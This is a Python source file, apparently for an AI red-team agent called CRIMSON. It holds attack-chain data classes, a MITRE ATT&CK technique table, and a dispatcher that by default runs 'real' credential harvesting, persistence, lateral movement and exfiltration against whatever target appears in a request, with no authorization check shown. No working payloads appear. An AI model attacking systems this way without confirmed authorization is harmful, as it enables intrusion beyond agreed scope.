"""
red_specter.py — CRIMSON (Red Specter)
Offensive operations agent. Real MITRE ATT&CK TTP execution (safe environments),
attack chain orchestration, lateral movement simulation, persistence testing,
exfiltration pathways, social engineering, physical security assessment.

Author: IRIS v1.0 (Merged & Enhanced)
"""

import json
import logging
import os
import re
import subprocess
import threading
import time
import random
import hashlib
import base64
import socket
import urllib.request
import ipaddress
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Union
from dataclasses import dataclass, field, asdict
from enum import Enum, auto
from collections import defaultdict

# Optional dependencies with graceful degradation
try:
    import paramiko
except ImportError:
    paramiko = None

try:
    import scapy.all as scapy
except ImportError:
    scapy = None

try:
    import requests
except ImportError:
    requests = None

# Core import (after moving base_agent to core)
from core.base_agent import BaseAgent, Task, TaskResult, AgentStatus, TaskPriority

logger = logging.getLogger("CRIMSON")


# ==============================================================================
# ENUMERATIONS & CONSTANTS
# ==============================================================================
class TTPStatus(Enum):
    PENDING = auto()
    RUNNING = auto()
    SUCCESS = auto()
    FAILED = auto()
    BLOCKED = auto()
    TIMEOUT = auto()

class ChainPhase(Enum):
    RECONNAISSANCE = "Reconnaissance"
    WEAPONIZATION = "Weaponization"
    DELIVERY = "Delivery"
    EXPLOITATION = "Exploitation"
    INSTALLATION = "Installation"
    C2 = "Command and Control"
    ACTIONS_ON_OBJECTIVES = "Actions on Objectives"
    EXFILTRATION = "Exfiltration"
    IMPACT = "Impact"

class RiskLevel(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

MITRE_TACTIC_WEIGHTS = {
    "Credential Access": 1.5,
    "Lateral Movement": 1.4,
    "Exfiltration": 1.3,
    "Persistence": 1.2,
    "Command and Control": 1.2,
    "Defense Evasion": 1.15,
    "Execution": 1.0,
    "Collection": 1.0,
    "Discovery": 0.9,
    "Initial Access": 1.1,
    "Privilege Escalation": 1.35,
    "Impact": 1.25,
}

# ==============================================================================
# DATA STRUCTURES
# ==============================================================================
@dataclass
class IOC:
    """Indicator of Compromise record."""
    type: str  # ip, domain, hash, url, email, file_path, registry_key
    value: str
    confidence: str = "medium"  # low, medium, high
    context: str = ""
    first_seen: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    source: str = "CRIMSON"

@dataclass
class Artifact:
    """Evidence/artifact from TTP execution."""
    name: str
    path: str
    hash_md5: str = ""
    hash_sha256: str = ""
    size_bytes: int = 0
    description: str = ""
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class TTPRecord:
    """Enhanced MITRE ATT&CK TTP execution record."""
    technique_id: str
    technique_name: str
    tactic: str
    description: str
    execution_time: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    target: str = ""
    status: TTPStatus = TTPStatus.PENDING
    success: bool = False
    output: str = ""
    artifacts: List[Artifact] = field(default_factory=list)
    iocs: List[IOC] = field(default_factory=list)
    duration_seconds: float = 0.0
    command_executed: str = ""
    detection_evasion_score: float = 0.0  # 0-100, higher = more evasive
    remediation_priority: RiskLevel = RiskLevel.MEDIUM
    related_cves: List[str] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)
    detection_rules: List[str] = field(default_factory=list)

@dataclass
class AttackChain:
    """Enhanced attack chain with full lifecycle tracking."""
    chain_id: str
    name: str
    objective: str
    kill_chain_phase: ChainPhase = ChainPhase.RECONNAISSANCE
    ttps: List[TTPRecord] = field(default_factory=list)
    status: str = "pending"
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    started_at: Optional[str] = None
    completed_at: Optional[str] = None
    risk_score: float = 0.0
    target_scope: List[str] = field(default_factory=list)
    detected_by: List[str] = field(default_factory=list)
    evasion_techniques: List[str] = field(default_factory=list)
    estimated_time_to_compromise: str = "unknown"
    blast_radius: str = "unknown"
    business_impact: str = ""

@dataclass
class NetworkSegment:
    """Network segment for lateral movement planning."""
    segment_id: str
    cidr: str
    hosts: List[Dict[str, Any]] = field(default_factory=list)
    services: List[Dict[str, Any]] = field(default_factory=list)
    trust_relationships: List[str] = field(default_factory=list)
    segmentation_level: str = "unknown"  # flat, segmented, microsegmented

@dataclass
class CampaignMetrics:
    """Metrics for social engineering campaigns."""
    emails_sent: int = 0
    emails_opened: int = 0
    links_clicked: int = 0
    credentials_captured: int = 0
    attachments_opened: int = 0
    callbacks_received: int = 0
    conversion_rate: float = 0.0
    dwell_time_avg_seconds: float = 0.0


# ==============================================================================
# RED SPECTER (CRIMSON) — Enhanced Offensive Operations Agent
# ==============================================================================
class RedSpecter(BaseAgent):
    """
    CRIMSON — Red Specter. I think like the enemy, move like the enemy,
    strike like the enemy. Real TTP execution, attack chains, lateral movement,
    persistence, exfiltration, social engineering, and physical assessments.

    Capabilities:
        - MITRE ATT&CK TTP execution (real shell/network)
        - Attack chain construction and orchestration
        - Lateral movement simulation (SSH, SMB, WMI, RDP, WinRM)
        - Persistence mechanism testing (registry, scheduled tasks, cron, systemd, WMI, DLL hijack)
        - Data exfiltration simulation (HTTPS, DNS, ICMP, steganography, covert channels)
        - Social engineering campaign generation with metrics tracking
        - Physical security assessment planning
        - Full red-team assessment reports with executive summaries
        - IOC extraction and artifact management
        - Evasion technique simulation
        - Threat intelligence enrichment
    """

    def __init__(self):
        super().__init__(
            name="CRIMSON",
            domain="cyber_security",
            personality="Ruthless, creative, and patient. I am the shadow that tests your defenses before the real threat arrives.",
            capabilities=[
                "attack_chain_simulation",
                "mitre_attack_mapping",
                "real_ttp_execution",
                "lateral_movement_simulation",
                "persistence_deployment_analysis",
                "data_exfiltration_simulation",
                "social_engineering_generation",
                "physical_security_assessment",
                "red_team_reporting",
                "ioc_extraction",
                "evasion_technique_simulation",
                "threat_intelligence_enrichment",
                "vulnerability_exploitation_simulation",
                "credential_harvesting",
                "network_reconnaissance",
                "covert_channel_simulation",
            ],
        )
        self._lock = threading.RLock()
        self._session_id = hashlib.sha256(
            f"crimson_{time.time()}_{random.randint(1000,9999)}".encode()
        ).hexdigest()[:16]
        self._attack_chains: Dict[str, AttackChain] = {}
        self._ttp_history: List[TTPRecord] = []
        self._iocs: List[IOC] = []
        self._artifacts: List[Artifact] = []
        self._campaign_metrics: Dict[str, CampaignMetrics] = {}
        self._network_map: Dict[str, NetworkSegment] = {}
        self._logger = logger
        self._logger.info(f"[CRIMSON] Session {self._session_id} initialized")

    # --------------------------------------------------------------------------
    # BaseAgent lifecycle overrides
    # --------------------------------------------------------------------------
    def health_check(self) -> Dict[str, Any]:
        """Provide comprehensive health status."""
        with self._lock:
            active_chains = [c for c in self._attack_chains.values() if c.status == "running"]
            return {
                "agent": self.name,
                "domain": self.domain,
                "session_id": self._session_id,
                "status": self.status.value,
                "active_chains": len(active_chains),
                "total_chains": len(self._attack_chains),
                "ttp_history_count": len(self._ttp_history),
                "successful_ttps": len([t for t in self._ttp_history if t.success]),
                "failed_ttps": len([t for t in self._ttp_history if not t.success]),
                "total_iocs": len(self._iocs),
                "total_artifacts": len(self._artifacts),
                "load": round(self.load, 2),
                "uptime_seconds": time.time() - self._start_time if hasattr(self, '_start_time') else 0,
            }

    def _execute_impl(self, task: Task) -> Any:
        """
        Route incoming tasks to appropriate offensive methods.

        REAL MODE IS THE DEFAULT. IRIS never fabricates security findings —
        every scan/probe is an actual network operation, and anything that
        cannot run in this environment is reported as not-run with the reason.
        """
        payload = task.payload
        request = payload.get("original_request", task.description).lower()
        # Extract a REAL target (URL/domain/IP) from the request — never a
        # made-up placeholder.
        target = payload.get("target") or self._extract_target_from(request or "")
        real_mode = payload.get("real_mode", True)

        # --- Attack Chain ---
        if any(kw in request for kw in ["attack chain", "ttp", "mitre", "attack simulation", "kill chain"]):
            return self._handle_attack_chain(target, payload, real_mode)

        # --- Lateral Movement ---
        elif any(kw in request for kw in ["lateral", "move", "pivot", "spread", "hop"]):
            return self._handle_lateral_movement(target, payload, real_mode)

        # --- Persistence ---
        elif any(kw in request for kw in ["persistence", "backdoor", "maintain access", "survive reboot"]):
            return self._handle_persistence(target, payload, real_mode)

        # --- Exfiltration ---
        elif any(kw in request for kw in ["exfiltrate", "exfiltration", "data theft", "steal data", "covert channel"]):
            return self._handle_exfiltration(target, payload, real_mode)

        # --- Social Engineering ---
        elif any(kw in request for kw in ["social engineer", "phishing", "spearphish", "pretext", "vishing", "smishing"]):
            return self._handle_social_engineering(target, payload)

        # --- Physical Assessment ---
        elif any(kw in request for kw in ["physical", "site", "building", "premise", "tailgating", "badge"]):
            return self._handle_physical(target, payload)

        # --- Exploit / CVE ---
        elif any(kw in request for kw in ["exploit", "cve", "vulnerability exploit", "zero day", "0day"]):
            return self._handle_exploit(target, payload)

        # --- Reconnaissance ---
        elif any(kw in request for kw in ["recon", "reconnaissance", "scan", "enumerate", "discover", "osint"]):
            return self._handle_reconnaissance(target, payload, real_mode)

        # --- Credential Harvesting ---
        elif any(kw in request for kw in ["credential", "password", "hash", "dump", "harvest", "mimikatz"]):
            return self._handle_credential_harvesting(target, payload, real_mode)

        # --- Evasion ---
        elif any(kw in request for kw in ["evade", "evasion", "bypass", "avoid detection", "amsi bypass", "obfuscate"]):
            return self._handle_evasion(target, payload)

        # --- Full red team ---
        else:
            return self.full_red_team_assessment(target, payload)

    # --------------------------------------------------------------------------
    # Target extraction — pull a real URL / domain / IP from free text
    # --------------------------------------------------------------------------
    @staticmethod
    def _extract_target_from(text: str) -> str:
        import re as _re
        m = _re.search(r"https?://[^\s'\"<>]+", text)
        if m:
            return m.group(0).rstrip(".,;:)")
        m = _re.search(r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b", text)
        if m:
            return m.group(0)
        m = _re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text)
        if m:
            return m.group(0)
        return ""

    # --------------------------------------------------------------------------
    # Enhanced Dispatchers
    # --------------------------------------------------------------------------
    def _handle_attack_chain(self, target: str, payload: Dict, real_mode: bool) -> Dict:
        chain_type = payload.get("chain_type", "apt_style")
        technique_ids = payload.get("technique_ids", ["T1059", "T1003", "T1071", "T1021"])
        evasion = payload.get("evasion", False)

        if real_mode:
            chain = self.build_attack_chain(
                name=f"Real_Chain_{chain_type}_{self._session_id}",
                objective=f"Real TTP execution against {target}",
                technique_ids=technique_ids,
                evasion=evasion
            )
            result = self.execute_attack_chain(chain.chain_id, target, payload)
            return {
                "mode": "real",
                "chain_id": result.chain_id,
                "risk_score": result.risk_score,
                "ttps_executed": [asdict(t) for t in result.ttps],
                "status": result.status,
                "iocs_generated": [asdict(i) for i in self._iocs[-20:]],
                "artifacts": [asdict(a) for a in self._artifacts[-10:]],
                "recommendations": self._get_mitre_recommendations(),
                "detection_rules": self._generate_sigma_rules(result),
                "executive_summary": self._generate_executive_summary(result),
            }
        else:
            return self.simulate_attack_chain(target, payload)

    def _handle_lateral_movement(self, target: str, payload: Dict, real_mode: bool) -> Dict:
        if real_mode:
            credentials = payload.get("credentials", {})
            method = payload.get("method", "ssh")
            targets = payload.get("targets", [target])
            network_map = payload.get("network_map", None)
            result = self.simulate_lateral_movement(
                source=payload.get("source", "localhost"),
                targets=targets,
                method=method,
                credentials=credentials,
                network_map=network_map
            )
            return {
                "mode": "real",
                "results": result,
                "network_map": {k: asdict(v) for k, v in self._network_map.items()},
                "recommendations": self._get_lateral_recommendations(),
                "detection_rules": self._generate_lateral_movement_detection(),
            }
        else:
            return self.simulate_lateral_movement(target, payload)

    def _handle_persistence(self, target: str, payload: Dict, real_mode: bool) -> Dict:
        if real_mode:
            mechanisms = payload.get("mechanisms", ["registry", "scheduled_task", "cron", "systemd", "wmi", "service"])
            result = self.test_persistence_mechanisms(target, mechanisms)
            return {
                "mode": "real",
                "results": result,
                "recommendations": self._get_persistence_recommendations(),
                "persistence_hunt_queries": self._generate_persistence_hunt_queries(),
            }
        else:
            return self.deploy_persistence(target, payload)

    def _handle_exfiltration(self, target: str, payload: Dict, real_mode: bool) -> Dict:
        if real_mode:
            data_source = payload.get("data_source", "TEST_DATA")
            destination = payload.get("destination", "http://127.0.0.1:8080/exfil")
            method = payload.get("method", "https")
            result = self.simulate_exfiltration(data_source, destination, method, payload)
            return {
                "mode": "real",
                "result": result,
                "recommendations": self._get_exfil_recommendations(),
                "dlp_rules": self._generate_dlp_rules(),
            }
        else:
            return self.simulate_exfiltration(target, payload)

    def _handle_social_engineering(self, target: str, payload: Dict) -> Dict:
        campaign_type = payload.get("campaign_type", "phishing")
        multi_stage = payload.get("multi_stage", False)
        campaign = self.generate_social_engineering_campaign(
            target_org=target,
            campaign_type=campaign_type,
            options=payload,
            multi_stage=multi_stage
        )
        return campaign

    def _handle_physical(self, target: str, payload: Dict) -> Dict:
        return self.plan_physical_security_assessment(target, payload)

    def _handle_exploit(self, target: str, payload: Dict) -> Dict:
        return self.deploy_exploit(target, payload)

    def _handle_reconnaissance(self, target: str, payload: Dict, real_mode: bool) -> Dict:
        recon_type = payload.get("recon_type", "network")
        if real_mode and recon_type == "network":
            return self._perform_network_recon(target, payload)
        elif real_mode and recon_type == "host":
            return self._perform_host_recon(target, payload)
        else:
            return self._simulate_reconnaissance(target, payload)

    def _handle_credential_harvesting(self, target: str, payload: Dict, real_mode: bool) -> Dict:
        if real_mode:
            return self._harvest_credentials_real(target, payload)
        else:
            return self._simulate_credential_harvesting(target, payload)

    def _handle_evasion(self, target: str, payload: Dict) -> Dict:
        evasion_type = payload.get("evasion_type", "amsi")
        return self.simulate_evasion_technique(evasion_type, target, payload)

    # --------------------------------------------------------------------------
    # ENHANCED MITRE ATT&CK TTP DATABASE (Expanded)
    # --------------------------------------------------------------------------
    MITRE_TTPS: Dict[str, Dict[str, Any]] = {
        # Execution
        "T1059": {
            "name": "Command and Scripting Interpreter",
            "tactic": "Execution",
            "description": "Execute commands via shell, PowerShell, Python, VBScript, JavaScript",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1059.001", "T1059.003", "T1059.004", "T1059.005", "T1059.006"],
            "detection_difficulty": "medium",
        },
        "T1059.001": {
            "name": "PowerShell",
            "tactic": "Execution",
            "description": "Adversaries may abuse PowerShell commands and scripts",
            "platforms": ["Windows"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1059.003": {
            "name": "Windows Command Shell",
            "tactic": "Execution",
            "description": "Adversaries may abuse cmd.exe to execute commands",
            "platforms": ["Windows"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1059.006": {
            "name": "Python",
            "tactic": "Execution",
            "description": "Adversaries may abuse Python commands and scripts",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        # Credential Access
        "T1003": {
            "name": "OS Credential Dumping",
            "tactic": "Credential Access",
            "description": "Dump credentials from memory (LSASS), SAM database, or Kerberos tickets",
            "platforms": ["Windows", "Linux"],
            "requires_admin": True,
            "sub_techniques": ["T1003.001", "T1003.002", "T1003.004", "T1003.006"],
            "detection_difficulty": "high",
        },
        "T1003.001": {
            "name": "LSASS Memory",
            "tactic": "Credential Access",
            "description": "Dump credentials from LSASS memory using mimikatz or similar",
            "platforms": ["Windows"],
            "requires_admin": True,
            "detection_difficulty": "high",
        },
        "T1003.002": {
            "name": "Security Account Manager (SAM)",
            "tactic": "Credential Access",
            "description": "Dump password hashes from SAM registry hive",
            "platforms": ["Windows"],
            "requires_admin": True,
            "detection_difficulty": "high",
        },
        "T1110": {
            "name": "Brute Force",
            "tactic": "Credential Access",
            "description": "Password guessing, spraying, and credential stuffing attacks",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1110.001", "T1110.002", "T1110.003", "T1110.004"],
            "detection_difficulty": "low",
        },
        "T1558": {
            "name": "Steal or Forge Kerberos Tickets",
            "tactic": "Credential Access",
            "description": "Kerberoasting, AS-REP Roasting, Golden/Silver tickets",
            "platforms": ["Windows"],
            "requires_admin": False,
            "sub_techniques": ["T1558.001", "T1558.002", "T1558.003", "T1558.004"],
            "detection_difficulty": "high",
        },
        # Command and Control
        "T1071": {
            "name": "Application Layer Protocol",
            "tactic": "Command and Control",
            "description": "Use application layer protocols (HTTP, HTTPS, DNS) for C2",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1071.001", "T1071.002", "T1071.003", "T1071.004"],
            "detection_difficulty": "medium",
        },
        "T1071.001": {
            "name": "Web Protocols",
            "tactic": "Command and Control",
            "description": "Use HTTP/HTTPS for C2 communications",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1071.004": {
            "name": "DNS",
            "tactic": "Command and Control",
            "description": "Use DNS for C2 communications",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "high",
        },
        "T1572": {
            "name": "Protocol Tunneling",
            "tactic": "Command and Control",
            "description": "Tunnel traffic through protocols like DNS, ICMP, SSH",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "high",
        },
        "T1095": {
            "name": "Non-Application Layer Protocol",
            "tactic": "Command and Control",
            "description": "Use protocols like ICMP for C2",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "high",
        },
        # Lateral Movement
        "T1021": {
            "name": "Remote Services",
            "tactic": "Lateral Movement",
            "description": "Move laterally via SSH, SMB, RDP, WinRM, VNC",
            "platforms": ["Windows", "Linux"],
            "requires_admin": False,
            "sub_techniques": ["T1021.001", "T1021.002", "T1021.004", "T1021.006"],
            "detection_difficulty": "medium",
        },
        "T1021.002": {
            "name": "SMB/Windows Admin Shares",
            "tactic": "Lateral Movement",
            "description": "Use SMB and admin shares for lateral movement",
            "platforms": ["Windows"],
            "requires_admin": True,
            "detection_difficulty": "medium",
        },
        "T1021.001": {
            "name": "Remote Desktop Protocol",
            "tactic": "Lateral Movement",
            "description": "Use RDP for lateral movement",
            "platforms": ["Windows"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1021.004": {
            "name": "SSH",
            "tactic": "Lateral Movement",
            "description": "Use SSH for lateral movement",
            "platforms": ["Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1021.006": {
            "name": "Windows Remote Management",
            "tactic": "Lateral Movement",
            "description": "Use WinRM for lateral movement",
            "platforms": ["Windows"],
            "requires_admin": True,
            "detection_difficulty": "medium",
        },
        # Persistence
        "T1053": {
            "name": "Scheduled Task/Job",
            "tactic": "Persistence",
            "description": "Create scheduled tasks or cron jobs for persistence",
            "platforms": ["Windows", "Linux"],
            "requires_admin": False,
            "sub_techniques": ["T1053.002", "T1053.003", "T1053.005"],
            "detection_difficulty": "low",
        },
        "T1547": {
            "name": "Boot or Logon Autostart Execution",
            "tactic": "Persistence",
            "description": "Registry run keys, startup folders, login items",
            "platforms": ["Windows", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1547.001", "T1547.002", "T1547.004", "T1547.009"],
            "detection_difficulty": "low",
        },
        "T1547.001": {
            "name": "Registry Run Keys",
            "tactic": "Persistence",
            "description": "Add entries to registry run keys for persistence",
            "platforms": ["Windows"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1543": {
            "name": "Create or Modify System Process",
            "tactic": "Persistence",
            "description": "Create or modify Windows services, systemd services",
            "platforms": ["Windows", "Linux"],
            "requires_admin": True,
            "sub_techniques": ["T1543.001", "T1543.002", "T1543.003", "T1543.004"],
            "detection_difficulty": "medium",
        },
        "T1543.003": {
            "name": "Windows Service",
            "tactic": "Persistence",
            "description": "Create or modify Windows services for persistence",
            "platforms": ["Windows"],
            "requires_admin": True,
            "detection_difficulty": "medium",
        },
        "T1546": {
            "name": "Event Triggered Execution",
            "tactic": "Persistence",
            "description": "Use event triggers for execution (WMI, DLL hijacking)",
            "platforms": ["Windows", "Linux"],
            "requires_admin": False,
            "sub_techniques": ["T1546.001", "T1546.002", "T1546.003", "T1546.008", "T1546.011", "T1546.012"],
            "detection_difficulty": "high",
        },
        "T1546.003": {
            "name": "Windows Management Instrumentation Event Subscription",
            "tactic": "Persistence",
            "description": "Use WMI event subscriptions for persistence",
            "platforms": ["Windows"],
            "requires_admin": True,
            "detection_difficulty": "high",
        },
        "T1546.011": {
            "name": "Application Shimming",
            "tactic": "Persistence",
            "description": "Use application compatibility shims for persistence",
            "platforms": ["Windows"],
            "requires_admin": True,
            "detection_difficulty": "high",
        },
        "T1505": {
            "name": "Server Software Component",
            "tactic": "Persistence",
            "description": "Web shells, backdoored server components",
            "platforms": ["Windows", "Linux"],
            "requires_admin": False,
            "sub_techniques": ["T1505.001", "T1505.002", "T1505.003", "T1505.004", "T1505.005"],
            "detection_difficulty": "medium",
        },
        # Exfiltration
        "T1041": {
            "name": "Exfiltration Over C2 Channel",
            "tactic": "Exfiltration",
            "description": "Exfiltrate data over existing C2 channel",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1567": {
            "name": "Exfiltration Over Web Service",
            "tactic": "Exfiltration",
            "description": "Exfiltrate via web services (HTTP/HTTPS, cloud storage)",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1567.001", "T1567.002", "T1567.003", "T1567.004"],
            "detection_difficulty": "medium",
        },
        "T1567.002": {
            "name": "Exfiltration to Cloud Storage",
            "tactic": "Exfiltration",
            "description": "Exfiltrate data to cloud storage services",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1048": {
            "name": "Exfiltration Over Alternative Protocol",
            "tactic": "Exfiltration",
            "description": "Exfiltrate via DNS, ICMP, or other protocols",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1048.001", "T1048.002", "T1048.003"],
            "detection_difficulty": "high",
        },
        "T1048.003": {
            "name": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
            "tactic": "Exfiltration",
            "description": "Exfiltrate via DNS tunneling or ICMP",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "high",
        },
        "T1560": {
            "name": "Archive Collected Data",
            "tactic": "Collection",
            "description": "Compress and encrypt data before exfiltration",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1560.001", "T1560.002", "T1560.003"],
            "detection_difficulty": "low",
        },
        "T1560.001": {
            "name": "Archive via Utility",
            "tactic": "Collection",
            "description": "Use archiving utilities like tar, zip, rar",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        # Defense Evasion
        "T1027": {
            "name": "Obfuscated Files or Information",
            "tactic": "Defense Evasion",
            "description": "Obfuscate files, scripts, or information",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1027.001", "T1027.002", "T1027.004", "T1027.005", "T1027.006"],
            "detection_difficulty": "high",
        },
        "T1027.002": {
            "name": "Software Packing",
            "tactic": "Defense Evasion",
            "description": "Pack or encrypt payloads to evade detection",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "high",
        },
        "T1055": {
            "name": "Process Injection",
            "tactic": "Defense Evasion",
            "description": "Inject code into running processes",
            "platforms": ["Windows", "Linux"],
            "requires_admin": False,
            "sub_techniques": ["T1055.001", "T1055.002", "T1055.003", "T1055.004", "T1055.005", "T1055.012"],
            "detection_difficulty": "high",
        },
        "T1218": {
            "name": "System Binary Proxy Execution",
            "tactic": "Defense Evasion",
            "description": "Abuse signed system binaries (lolbas) for execution",
            "platforms": ["Windows"],
            "requires_admin": False,
            "sub_techniques": ["T1218.001", "T1218.002", "T1218.003", "T1218.004", "T1218.005", "T1218.007", "T1218.008", "T1218.009", "T1218.010", "T1218.011", "T1218.012"],
            "detection_difficulty": "high",
        },
        "T1218.011": {
            "name": "Rundll32",
            "tactic": "Defense Evasion",
            "description": "Abuse rundll32.exe for execution",
            "platforms": ["Windows"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1218.010": {
            "name": "Regsvr32",
            "tactic": "Defense Evasion",
            "description": "Abuse regsvr32.exe for execution",
            "platforms": ["Windows"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1562": {
            "name": "Impair Defenses",
            "tactic": "Defense Evasion",
            "description": "Disable or modify security tools and logging",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": True,
            "sub_techniques": ["T1562.001", "T1562.002", "T1562.003", "T1562.004", "T1562.006", "T1562.007", "T1562.008", "T1562.009", "T1562.010", "T1562.011"],
            "detection_difficulty": "high",
        },
        "T1562.001": {
            "name": "Disable or Modify Tools",
            "tactic": "Defense Evasion",
            "description": "Disable or modify security tools like EDR, AV",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": True,
            "detection_difficulty": "high",
        },
        "T1070": {
            "name": "Indicator Removal",
            "tactic": "Defense Evasion",
            "description": "Clear logs, delete files, modify timestamps",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1070.001", "T1070.002", "T1070.003", "T1070.004", "T1070.005", "T1070.006", "T1070.007", "T1070.008", "T1070.009"],
            "detection_difficulty": "high",
        },
        "T1070.004": {
            "name": "File Deletion",
            "tactic": "Defense Evasion",
            "description": "Delete files to remove indicators",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        # Discovery
        "T1083": {
            "name": "File and Directory Discovery",
            "tactic": "Discovery",
            "description": "Enumerate files and directories",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1018": {
            "name": "Remote System Discovery",
            "tactic": "Discovery",
            "description": "Identify remote systems and network topology",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1046": {
            "name": "Network Service Scanning",
            "tactic": "Discovery",
            "description": "Scan for open ports and services",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1082": {
            "name": "System Information Discovery",
            "tactic": "Discovery",
            "description": "Gather system information",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1016": {
            "name": "System Network Configuration Discovery",
            "tactic": "Discovery",
            "description": "Gather network configuration information",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1033": {
            "name": "System Owner/User Discovery",
            "tactic": "Discovery",
            "description": "Identify system owners and users",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1007": {
            "name": "System Service Discovery",
            "tactic": "Discovery",
            "description": "Enumerate system services",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        # Initial Access
        "T1566": {
            "name": "Phishing",
            "tactic": "Initial Access",
            "description": "Use phishing emails for initial access",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1566.001", "T1566.002", "T1566.003"],
            "detection_difficulty": "medium",
        },
        "T1566.001": {
            "name": "Spearphishing Attachment",
            "tactic": "Initial Access",
            "description": "Use malicious attachments in spearphishing",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1566.002": {
            "name": "Spearphishing Link",
            "tactic": "Initial Access",
            "description": "Use malicious links in spearphishing",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1190": {
            "name": "Exploit Public-Facing Application",
            "tactic": "Initial Access",
            "description": "Exploit vulnerabilities in public-facing applications",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "medium",
        },
        "T1133": {
            "name": "External Remote Services",
            "tactic": "Initial Access",
            "description": "Use external remote services like VPN for initial access",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        # Privilege Escalation
        "T1068": {
            "name": "Exploitation for Privilege Escalation",
            "tactic": "Privilege Escalation",
            "description": "Exploit vulnerabilities to escalate privileges",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "high",
        },
        "T1055": {
            "name": "Process Injection",
            "tactic": "Privilege Escalation",
            "description": "Inject into higher-privilege processes",
            "platforms": ["Windows", "Linux"],
            "requires_admin": False,
            "detection_difficulty": "high",
        },
        "T1078": {
            "name": "Valid Accounts",
            "tactic": "Privilege Escalation",
            "description": "Use valid accounts for privilege escalation",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1078.001", "T1078.002", "T1078.003", "T1078.004"],
            "detection_difficulty": "medium",
        },
        # Collection
        "T1005": {
            "name": "Data from Local System",
            "tactic": "Collection",
            "description": "Collect data from local system",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1039": {
            "name": "Data from Network Shared Drive",
            "tactic": "Collection",
            "description": "Collect data from network shares",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "detection_difficulty": "low",
        },
        "T1213": {
            "name": "Data from Information Repositories",
            "tactic": "Collection",
            "description": "Collect data from SharePoint, Confluence, etc.",
            "platforms": ["Windows", "Linux", "macOS"],
            "requires_admin": False,
            "sub_techniques": ["T1213.001", "T1213.002", "T1213.003"],
            "detection_difficulty": "medium",
        },
        # Impact
